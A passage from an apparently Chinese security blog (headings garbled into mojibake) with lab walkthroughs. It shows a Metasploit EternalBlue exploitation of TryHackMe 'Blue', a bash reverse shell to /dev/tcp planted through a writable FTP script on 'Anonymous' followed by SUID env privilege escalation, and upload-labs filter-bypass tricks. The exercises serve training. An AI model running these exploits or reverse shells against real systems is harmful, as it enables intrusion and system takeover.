    <content><![CDATA[<h2 id="0x01-Demo"><a href="#0x01-Demo" class="headerlink" title="0x01.Demo"></a>0x01.Demo</h2><img src="/2021/01/15/tryhackme-blue/image-20210115194912000.png" class>

<a id="more"></a>

<h2 id="0x02-ä¿¡æ¯æ”¶é›†"><a href="#0x02-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x02.ä¿¡æ¯æ”¶é›†"></a>0x02.ä¿¡æ¯æ”¶é›†</h2><p><code>çœ‹åˆ°äº†ms17-010(æ°¸æ’ä¹‹è“)</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/blue# nmap -sC -vv --script=vuln 10.10.246.255 -oN nmap.demo</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-15 05:38 EST</span><br><span class="line">NSE: Loaded 105 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:38</span><br><span class="line">Completed NSE at 05:38, 10.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:38</span><br><span class="line">Completed NSE at 05:38, 0.00s elapsed</span><br><span class="line">Initiating Ping Scan at 05:38</span><br><span class="line">Scanning 10.10.246.255 [4 ports]</span><br><span class="line">Completed Ping Scan at 05:38, 0.30s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 05:38</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 05:38, 0.02s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 05:38</span><br><span class="line">Scanning 10.10.246.255 [1000 ports]</span><br><span class="line">Discovered open port 445/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 3389/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 139/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 135/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49154/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49159/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49153/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49158/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49152/tcp on 10.10.246.255</span><br><span class="line">Completed SYN Stealth Scan at 05:39, 46.22s elapsed (1000 total ports)</span><br><span class="line">NSE: Script scanning 10.10.246.255.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:39</span><br><span class="line">NSE: [ssl-ccs-injection 10.10.246.255:3389] No response from server: ERROR</span><br><span class="line">NSE Timing: About 88.47% done; ETC: 05:39 (0:00:04 remaining)</span><br><span class="line">NSE Timing: About 89.08% done; ETC: 05:40 (0:00:07 remaining)</span><br><span class="line">Completed NSE at 05:40, 90.23s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">Nmap scan report for 10.10.246.255</span><br><span class="line">Host is up, received echo-reply ttl 127 (0.25s latency).</span><br><span class="line">Scanned at 2021-01-15 05:38:32 EST for 136s</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">Reason: 991 resets</span><br><span class="line">PORT      STATE SERVICE       REASON</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127</span><br><span class="line">445/tcp   open  microsoft-ds  syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127</span><br><span class="line">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">49152/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49153/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49154/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49158/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49159/tcp open  unknown       syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 147.23 seconds</span><br><span class="line">           Raw packets sent: 1189 (52.292KB) | Rcvd: 1066 (42.672KB)</span><br><span class="line">root@JIYE:~/tryhackme/blue#</span><br></pre></td></tr></table></figure>

<h2 id="0x03-MSFç›´æ¥åˆ©ç”¨"><a href="#0x03-MSFç›´æ¥åˆ©ç”¨" class="headerlink" title="0x03.MSFç›´æ¥åˆ©ç”¨"></a>0x03.MSFç›´æ¥åˆ©ç”¨</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.246.255</span><br><span class="line">rhosts =&gt; 10.10.246.255</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 10.9.248.83</span><br><span class="line">lhost =&gt; 10.9.248.83</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         10.10.246.255    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.9.248.83      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.9.248.83:4444 </span><br><span class="line">[*] 10.10.246.255:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.246.255:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.246.255:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.246.255:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.246.255:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.246.255:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.246.255:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.246.255:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.246.255:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.246.255:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.246.255:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.246.255:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.246.255:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.246.255:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.246.255:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.246.255:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.246.255:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.246.255:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.246.255:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.10.246.255</span><br><span class="line">[*] Meterpreter session 1 opened (10.9.248.83:4444 -&gt; 10.10.246.255:49201) at 2021-01-15 05:54:08 -0500</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Tryhackme</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>tryhackme-[Anonymous]</title>
    <url>/2021/01/13/tryhackme-Anonymous/</url>
    <content><![CDATA[<h2 id="0x01-Demo"><a href="#0x01-Demo" class="headerlink" title="0x01.Demo"></a>0x01.Demo</h2><img src="/2021/01/13/tryhackme-Anonymous/image-20210113134507401.png" class>

<a id="more"></a>

<h2 id="0x02-ä¿¡æ¯æ”¶é›†"><a href="#0x02-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x02.ä¿¡æ¯æ”¶é›†"></a>0x02.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†4ä¸ªç«¯å£21/22/139/445 å…¶ä¸­ftpå¼€æ”¾äº†åŒ¿åç™»å…¥ï¼Œä¸”ç›®å½•ä¸ºscripts</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# nmap -sC -sV -sT 10.10.7.51 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-13 00:46 EST</span><br><span class="line">Nmap scan report for 10.10.7.51</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.9.248.83</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 5</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)</span><br><span class="line">|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)</span><br><span class="line">|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1s, deviation: 2s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: anonymous</span><br><span class="line">|   NetBIOS computer name: ANONYMOUS\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: anonymous</span><br><span class="line">|_  System time: 2021-01-13T05:48:13+00:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-01-13T05:48:11</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 157.83 seconds</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹æœåŠ¡å…±äº«çš„èµ„æºï¼Œå‘ç°ä¸ºpics</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# smbclient -L 10.10.7.51</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        pics            Disk      My SMB Share Directory for Pics</span><br><span class="line">        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure>

<h2 id="0x03-åŒ¿åç™»å…¥ftp"><a href="#0x03-åŒ¿åç™»å…¥ftp" class="headerlink" title="0x03.åŒ¿åç™»å…¥ftp"></a>0x03.åŒ¿åç™»å…¥ftp</h2><p><code>å‘ç°scriptsç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¹¶ä¸‹è½½</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# ftp 10.10.7.51</span><br><span class="line">Connected to 10.10.7.51.</span><br><span class="line">220 NamelessOne&#x27;s FTP Server!</span><br><span class="line">Name (10.10.7.51:root): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">cd</span> scripts</span></span><br><span class="line">250 Directory successfully changed.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh</span><br><span class="line">-rw-rw-r--    1 1000     1000          946 Jan 13 05:47 removed_files.log</span><br><span class="line">-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get clean.sh</span></span><br><span class="line">local: clean.sh remote: clean.sh</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for clean.sh (314 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">314 bytes received in 0.00 secs (3.4820 MB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get removed_files.log</span></span><br><span class="line">local: removed_files.log remote: removed_files.log</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for removed_files.log (989 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">989 bytes received in 0.57 secs (1.6842 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get to_do.txt</span></span><br><span class="line">local: to_do.txt remote: to_do.txt</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for to_do.txt (68 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">68 bytes received in 0.60 secs (0.1115 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x04-æŸ¥çœ‹æ–‡ä»¶"><a href="#0x04-æŸ¥çœ‹æ–‡ä»¶" class="headerlink" title="0x04.æŸ¥çœ‹æ–‡ä»¶"></a>0x04.æŸ¥çœ‹æ–‡ä»¶</h2><p><code>å‘ç°clean.shä½œç”¨ä¸ºåˆ é™¤/tmpä¸‹çš„æ–‡ä»¶ï¼Œå¦å¤–ä¸¤ä¸ªæ–‡ä»¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# cat clean.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">tmp_files=0</span><br><span class="line">echo $tmp_files</span><br><span class="line">if [ $tmp_files=0 ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;Running cleanup script:  nothing to delete&quot; &gt;&gt; /var/ftp/scripts/removed_files.log</span><br><span class="line">else</span><br><span class="line">    for LINE in $tmp_files; do</span><br><span class="line">        rm -rf /tmp/$LINE &amp;&amp; echo &quot;$(date) | Removed file /tmp/$LINE&quot; &gt;&gt; /var/ftp/scripts/removed_files.log;done</span><br><span class="line">fi</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure>

<h2 id="0x05-åå¼¹shell"><a href="#0x05-åå¼¹shell" class="headerlink" title="0x05.åå¼¹shell"></a>0x05.åå¼¹shell</h2><p><code>ä¿®æ”¹clean.shå¹¶ä¸Šä¼ ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# cat clean.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.9.248.83/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0Lw==">shellåˆ©ç”¨<i class="fa fa-external-link-alt"></i></span></p>
<p><code>å¯¹æœåŠ¡å™¨æ–‡ä»¶è¿›è¡Œè¦†ç›–</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> put clean.sh clean.sh </span></span><br><span class="line">local: clean.sh remote: clean.sh</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Ok to send data.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">54 bytes sent in 0.00 secs (1.0098 MB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>

<p><code>kaliç›‘å¬ç«¯å£ï¼Œä½¿ç”¨rlwrapå°±å¯ä»¥ä½¿ç”¨é”®ç›˜ä¸Šä¸‹ç®­å¤´äº†</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# rlwrap nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.9.248.83] from (UNKNOWN) [10.10.136.156] 49676</span><br><span class="line">bash: cannot set terminal process group (1144): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">namelessone</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">pics</span><br><span class="line">user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">****************************</span><br></pre></td></tr></table></figure>

<h2 id="0x06-ææƒ"><a href="#0x06-ææƒ" class="headerlink" title="0x06.ææƒ"></a>0x06.ææƒ</h2><p><code>ä½¿ç”¨SUIDææƒ</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/nul</span><br><span class="line">æˆ–è€…</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/env</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZW52Lw==">envææƒå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/env /bin/sh -p</span><br><span class="line">id</span><br><span class="line">uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)</span><br><span class="line">ls</span><br><span class="line">pics</span><br><span class="line">user.txt</span><br><span class="line">pwd</span><br><span class="line">/home/namelessone</span><br><span class="line">cd /root</span><br><span class="line">pwd</span><br><span class="line">/root</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">*************************</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Tryhackme</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>upload_labs</title>
    <url>/2021/05/03/upload-labs/</url>
    <content><![CDATA[<h2 id="Pass01-åŸºäºå‰ç«¯jséªŒè¯"><a href="#Pass01-åŸºäºå‰ç«¯jséªŒè¯" class="headerlink" title="Pass01.åŸºäºå‰ç«¯jséªŒè¯"></a>Pass01.åŸºäºå‰ç«¯jséªŒè¯</h2><p><code>ä¸Šä¼ å›¾ç‰‡æŠ“åŒ…æ”¹åç¼€</code></p>
<h2 id="Pass02-æ£€æµ‹MIMEç±»å‹"><a href="#Pass02-æ£€æµ‹MIMEç±»å‹" class="headerlink" title="Pass02.æ£€æµ‹MIMEç±»å‹"></a>Pass02.æ£€æµ‹MIMEç±»å‹</h2><p><code>ä¿®æ”¹MIMEä¸ºimage/jpeg</code></p>
<a id="more"></a>

<h2 id="Pass03-é»‘åå•-æ–‡ä»¶åç¼€ç»•è¿‡"><a href="#Pass03-é»‘åå•-æ–‡ä»¶åç¼€ç»•è¿‡" class="headerlink" title="Pass03.é»‘åå• æ–‡ä»¶åç¼€ç»•è¿‡"></a>Pass03.é»‘åå• æ–‡ä»¶åç¼€ç»•è¿‡</h2><p><code>é¦–å…ˆä¿®æ”¹apache2é…ç½®æ–‡ä»¶</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/apache2/mods-available/mime.conf</span><br><span class="line">æ‰¾åˆ°AddType applicationï¼Œå¢åŠ ä¸€è¡Œï¼Œé‡å¯æœåŠ¡</span><br><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht .php3</span><br></pre></td></tr></table></figure>

<p><code>ä¸Šä¼ .php5æ–‡ä»¶</code></p>
<img src="/2021/05/03/upload-labs/image-20210501125955299.png" class>

<h2 id="Pass04-é»‘åå•-htaccessç»•è¿‡"><a href="#Pass04-é»‘åå•-htaccessç»•è¿‡" class="headerlink" title="Pass04.é»‘åå• .htaccessç»•è¿‡"></a>Pass04.é»‘åå• .htaccessç»•è¿‡</h2><p><code>å…ˆä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">æ­¤æ¡ä¼ªé™æ€è§„åˆ™ä¸ºå°†demoæ–‡ä»¶è§£ææˆphpæ–‡ä»¶æ‰§è¡Œ</span><br><span class="line">&lt;FilesMatch &quot;demo&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">ä¹Ÿå¯ä»¥æ˜¯ä»¥ä¸‹ï¼Œå°†æ‰€æœ‰æ–‡ä»¶è§£æä¸ºphp</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p><code>æœ¬æ¬¡ä½¿ç”¨ç¬¬äºŒæ¡ï¼Œå°†æ‰€æœ‰æ–‡ä»¶è§£æä¸ºphp</code></p>
<img src="/2021/05/03/upload-labs/image-20210501130707455.png" class>

<h2 id="Pass05-é»‘åå•-å¤§å°å†™ç»•è¿‡"><a href="#Pass05-é»‘åå•-å¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass05.é»‘åå• å¤§å°å†™ç»•è¿‡"></a>Pass05.é»‘åå• å¤§å°å†™ç»•è¿‡</h2><p><code>ç¦æ­¢ä¸Šä¼ .htaccess</code></p>
<img src="/2021/05/03/upload-labs/image-20210501131324884.png" class>

<h2 id="Pass06-é»‘åå•-ç©ºæ ¼ç»•è¿‡"><a href="#Pass06-é»‘åå•-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="Pass06.é»‘åå• ç©ºæ ¼ç»•è¿‡"></a>Pass06.é»‘åå• ç©ºæ ¼ç»•è¿‡</h2><p><code>ç¦æ­¢ä¸Šä¼ .htaccess</code></p>
<p><code>åœ¨æ–‡ä»¶ååŠ ä¸€ä¸ªç©ºæ ¼å³å¯(éœ€è¦åœ¨windowsç¯å¢ƒä¸‹ï¼Œwidowsè‡ªåŠ¨å»ç©ºæ ¼å’Œç‚¹)</code></p>
<h2 id="Pass07-é»‘åå•-ç‚¹ç»•è¿‡"><a href="#Pass07-é»‘åå•-ç‚¹ç»•è¿‡" class="headerlink" title="Pass07.é»‘åå• ç‚¹ç»•è¿‡"></a>Pass07.é»‘åå• ç‚¹ç»•è¿‡</h2><p><code>ç¦æ­¢ä¸Šä¼ .htaccess</code></p>
<p><code>åœ¨æ–‡ä»¶ååŠ ä¸€ä¸ªç‚¹å³å¯(æœ€å¥½åœ¨windowsç¯å¢ƒä¸‹)</code></p>
<img src="/2021/05/03/upload-labs/image-20210501134215848.png" class>

<h2 id="Pass08-é»‘åå•-DATAç»•è¿‡"><a href="#Pass08-é»‘åå•-DATAç»•è¿‡" class="headerlink" title="Pass08.é»‘åå• ::$DATAç»•è¿‡"></a>Pass08.é»‘åå• ::$DATAç»•è¿‡</h2><p><code>æ–‡ä»¶åç¼€æ·»åŠ ::$DATAç»•è¿‡(windowsç¯å¢ƒ)</code></p>
